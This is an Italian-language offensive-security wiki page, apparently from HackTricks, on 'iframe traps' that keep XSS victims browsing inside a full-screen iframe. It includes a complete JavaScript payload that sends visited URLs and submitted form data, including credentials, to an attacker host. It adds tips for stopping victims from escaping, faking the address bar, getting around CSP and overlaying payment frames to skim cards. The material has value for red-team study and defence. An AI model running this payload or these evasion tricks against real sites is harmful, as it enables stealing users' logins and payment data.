# Iframe Traps

{{#include ../banners/hacktricks-training.md}}

## Basic Information

Questa forma di abuso di XSS tramite iframe per rubare informazioni dall'utente che si sposta attraverso la pagina web è stata pubblicata originariamente in questi 2 post di trustedsec.com: [**here**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) **e** [**here**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams).

L'attacco parte da una pagina vulnerabile a XSS dove è possibile fare in modo che le **vittime non lascino l'XSS** facendole **navigare all'interno di un iframe** che occupa tutta l'applicazione web.

L'attacco XSS caricherà fondamentalmente la pagina web in un iframe che copre il 100% dello schermo. Di conseguenza, la vittima **non noterà di essere dentro un iframe**. Poi, se la vittima naviga nella pagina cliccando link all'interno dell'iframe (all'interno del web), starà **navigando dentro l'iframe** con l'Script JS arbitrario caricato che ruba informazioni da questa navigazione.

Inoltre, per rendere il tutto più realistico, è possibile usare alcuni **listeners** per controllare quando un iframe cambia la location della pagina, e aggiornare l'URL del browser con quelle location affinché l'utente pensi di star cambiando pagina usando il browser.

<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>

<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>

Inoltre, è possibile usare listeners per rubare informazioni sensibili, non solo le altre pagine che la vittima sta visitando, ma anche i dati usati per **compilare i form** e inviarli (credentials?) o per **rubare il local storage**...

Ovviamente, le principali limitazioni sono che una **vittima che chiude la scheda o inserisce un altro URL nel browser uscirà dall'iframe**. Un altro modo per farlo sarebbe **aggiornare la pagina**, tuttavia questo potrebbe essere parzialmente **prevenuto** disabilitando il menu contestuale del tasto destro ogni volta che viene caricata una nuova pagina dentro l'iframe o rilevando quando il mouse dell'utente esce dall'iframe, possibilmente per cliccare il pulsante di reload del browser e in questo caso l'URL del browser viene aggiornato con l'URL originale vulnerabile a XSS così se l'utente aggiorna la pagina verrà compromessa di nuovo (nota che questo non è molto stealth).

## Modernised trap (2024+)

* Usa un **full‑viewport iframe** più History/Navigation API per simulare una navigazione reale.

<details>
<summary>Full-viewport iframe trap</summary>
```html
<script>
const i=document.createElement('iframe');
i.src=location.href;
i.style='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);
function sync(url){history.replaceState({},'',url);}
i.addEventListener('load',()=>{
const w=i.contentWindow;
['hashchange','popstate'].forEach(ev=>w.addEventListener(ev,()=>sync(w.location.href)));
w.addEventListener('click',()=>fetch('//attacker/log',{method:'POST',body:w.location.href}));
w.document.addEventListener('submit',ev=>{
const fd=new FormData(ev.target);
fetch('//attacker/creds',{method:'POST',body:new URLSearchParams(fd)});
},true);
});
</script>
```
</details>

* **Navigation API** (`navigation.navigate`, `currententrychange`) mantiene la barra URL esterna sincronizzata senza leakare l'URL reale.
* Vai in **fullscreen** per nascondere l'UI del browser e disegnare la tua barra degli indirizzi/icona del lucchetto finta.

## Overlay & skimmer usage

* I merchant compromessi sostituiscono hosted payment iframes (Stripe, Adyen, etc.) con un **pixel‑perfect overlay** che inoltra le battiture mentre il frame reale rimane sotto, a volte usando legacy validation APIs in modo che il flusso non si interrompa.
* Intrappolare gli utenti nel top frame cattura i dati di **autofill/password‑manager** prima che si accorgano che la barra URL non è mai cambiata.

## Evasion tricks observed in 2025 research

* `about:blank`/`data:` local frames ereditano l'origine del parent e bypassano alcune euristiche dei content‑blocker; nested iframes possono respawnare anche quando le estensioni rimuovono i frame di terze parti.
* **Permission propagation**: riscrivere l'attributo parent `allow` concede ai nested attacker frames fullscreen/camera/microphone senza evidenti cambiamenti del DOM.

## Quick OPSEC tips

* Rifocalizza l'iframe quando il mouse esce (`mouseleave` sul body) per impedire agli utenti di raggiungere l'UI del browser.
* Disabilita il menu contestuale e le scorciatoie comuni (`keydown` per `F11`, `Ctrl+L`, `Ctrl+T`) all'interno del frame per rallentare i tentativi di fuga.
* Se CSP blocca gli script inline, inietta un bootstrapper remoto e abilita `srcdoc` sull'iframe così il tuo payload vive al di fuori della CSP applicata alla pagina principale.

## Related

{{#ref}}
clickjacking.md
{{#endref}}



## References

- [Iframe security exposed: blind spot fueling payment skimmer attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [Local Frames: exploiting inherited origins to bypass blockers (2025)](https://arxiv.org/abs/2506.00317)
{{#include ../banners/hacktricks-training.md}}
